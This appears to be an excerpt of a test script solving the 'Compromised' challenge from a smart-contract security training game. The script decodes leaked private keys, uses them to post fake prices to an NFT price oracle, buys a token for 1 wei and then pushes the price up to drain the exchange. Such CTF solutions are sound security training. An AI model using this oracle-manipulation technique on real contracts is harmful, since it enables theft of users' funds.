...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        for(let i=0; i<leackedKeys.length; i++) {
          const k = leackedKeys[i];
          const key = Buffer.from(Buffer.from(k, 'hex').toString('utf8'), 'base64').toString('utf8');
          keys.push(key);
        ...
        for(let i=0; i<sources.length; i++) {
          for(let j=0; j<keys.length; j++) {
            ...
            try {
              await oracle.connect(wallet).postPrice('DVNFT', 0);
            } catch(e) {}
          }
        }
        expect(await oracle.connect(player).getMedianPrice('DVNFT')).to.be.eq(0);

        const buyOneTx = await exchange.connect(player).buyOne({value: 1});
        const buyOneRes = await buyOneTx.wait();
        const tokenId = buyOneRes.events.find(event => event.event === 'TokenBought').args.tokenId;
        console.log(tokenId);
        ...
        for(let i=0; i<sources.length; i++) {
          for(let j=0; j<keys.length; j++) {
            ...
            const wallet = new ethers.Wallet(key, ethers.provider);
            try {
              await oracle.connect(wallet).postPrice('DVNFT', exchangeBalance);
            } catch(e) {}
          }
        }
        expect(await oracle.connect(player).getMedianPrice('DVNFT')).to.be.eq(exchangeBalance);
